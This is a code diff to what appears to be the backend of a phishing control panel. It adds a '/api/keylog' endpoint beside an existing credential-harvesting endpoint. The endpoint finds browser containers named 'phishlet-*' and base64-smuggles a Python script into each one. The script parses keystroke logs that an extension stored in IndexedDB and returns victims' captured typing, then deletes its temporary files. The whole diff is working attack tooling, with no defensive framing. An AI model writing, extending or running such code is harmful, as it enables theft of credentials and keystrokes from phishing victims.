@@ -1,5 +1,6 @@
 import os
 import json
+import base64
 import random
 import asyncio
 import logging
@@ -432,6 +433,117 @@ async def get_credentials(
             output.append(f"{name}\n{json.dumps(container_obj, indent=2)}")
         else:
             output.append(f"{name}\n{{}}")
+
+    return {"status": "success", "message": "\n\n".join(output)}
+
+@app.get("/api/keylog")
+async def get_keylog(email: str = Depends(get_current_user)):
+    list_result = await run_shell(
+        f"{docker_prefix}docker ps "
+        f"--filter name=^/phishlet- "
+        f"--format '{{{{.Names}}}}' 2>&1"
+    )
+    if list_result["status"] != "success":
+        return {"status": "error", "message": "Failed to list containers"}
+
+    names = [n.strip() for n in list_result["message"].strip().split("\n") if n.strip()]
+    if not names:
+        return {"status": "error", "message": "No browser containers running"}
+
+    output = []
+    for name in names:
+        db_result = await run_shell(
+            f"{docker_prefix}docker exec {name} sh -c "
+            f"\"find /config/profile/storage/default -path '*/moz-extension*/idb/*.sqlite' -type f 2>/dev/null\""
+        )
+        if db_result["status"] != "success" or not db_result["message"].strip():
+            output.append(f"{name}\n(no keylog data)")
+            continue
+
+        script = (
+            "import sqlite3, re, struct\n"
+            "db = sqlite3.connect('/tmp/kl.sqlite')\n"
+            "cur = db.cursor()\n"
+            "# detect column name (value for new LSNG, data for old IndexedDB)\n"
+            "cols = [r[1] for r in cur.execute('PRAGMA table_info(object_data)')]\n"
+            "col = 'value' if 'value' in cols else 'data'\n"
+            "\n"
+            "def parse_structured_clone(data):\n"
+            "    strings = []\n"
+            "    if len(data) < 8 or data[:4] != b'\\xff\\x00\\x00\\x00':\n"
+            "        return strings\n"
+            "    pos = 8\n"
+            "    while pos + 8 <= len(data):\n"
+            "        d = struct.unpack('<I', data[pos:pos+4])[0]\n"
+            "        t = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
+            "        pos += 8\n"
+            "        if t == 0xFFFF0002:  # STRING\n"
+            "            s = data[pos:pos+d].decode('utf-8', errors='replace')\n"
+            "            strings.append(s)\n"
+            "            pos += d\n"
+            "        elif t == 0xFFFF0007:  # OBJECT\n"
+            "            for _ in range(d):\n"
+            "                if pos + 8 > len(data): break\n"
+            "                kd = struct.unpack('<I', data[pos:pos+4])[0]\n"
+            "                kt = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
+            "                if kt != 0xFFFF0002: break\n"
+            "                pos += 8 + kd\n"
+            "                if pos + 8 > len(data): break\n"
+            "                vd = struct.unpack('<I', data[pos:pos+4])[0]\n"
+            "                vt = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
+            "                pos += 8\n"
+            "                if vt == 0xFFFF0002:\n"
+            "                    s = data[pos:pos+vd].decode('utf-8', errors='replace')\n"
+            "                    strings.append(s)\n"
+            "                    pos += vd\n"
+            "    return strings\n"
+            "\n"
+            "for row in cur.execute(f'SELECT {col} FROM object_data'):\n"
+            "    blob = row[0]\n"
+            "    if not blob or b'<timestamp:' not in blob:\n"
+            "        continue\n"
+            "    strings = []\n"
+            "    # method 1: structured clone parsing\n"
+            "    if len(blob) >= 8 and blob[:4] == b'\\xff\\x00\\x00\\x00':\n"
+            "        strings = parse_structured_clone(blob)\n"
+            "    # method 2 (fallback): raw extraction from <timestamp:\n"
+            "    if not strings:\n"
+            "        idx = blob.find(b'<timestamp:')\n"
+            "        if idx >= 0:\n"
+            "            s = ''.join(chr(b) for b in blob[idx:] if 32 <= b <= 126)\n"
+            "            if '<timestamp:' in s:\n"
+            "                strings = [s]\n"
+            "    for s in strings:\n"
+            "        if '<timestamp:' not in s:\n"
+            "            continue\n"
+            "        s = re.sub(r'<[^>]*?>', '', s)\n"
+            "        s = s.replace('<blank>', ' ')\n"
+            "        s = s.strip()\n"
+            "        if len(s) > 2:\n"
+            "            print(s)\n"
+        )
+        script_b64 = base64.b64encode(script.encode()).decode()
+
+        found = []
+        for db_path in db_result["message"].strip().split("\n"):
+            db_path = db_path.strip()
+            if not db_path:
+                continue
+            decode = await run_shell(
+                f"{docker_prefix}docker exec {name} sh -c "
+                f"\"echo '{script_b64}' | base64 -d > /tmp/decode_kl.py && "
+                f"cp '{db_path}' /tmp/kl.sqlite && "
+                f"python3 /tmp/decode_kl.py 2>/dev/null && "
+                f"rm /tmp/kl.sqlite /tmp/decode_kl.py\""
+            )
+            msg = decode["message"].strip()
+            if decode["status"] == "success" and msg and msg != "[OK] Done.":
+                found.append(msg)
+
+        if found:
+            output.append(f"{name}\n" + "\n".join(found))
+        else:
+            output.append(f"{name}\n(no keylog data)")
 
     return {"status": "success", "message": "\n\n".join(output)}
 
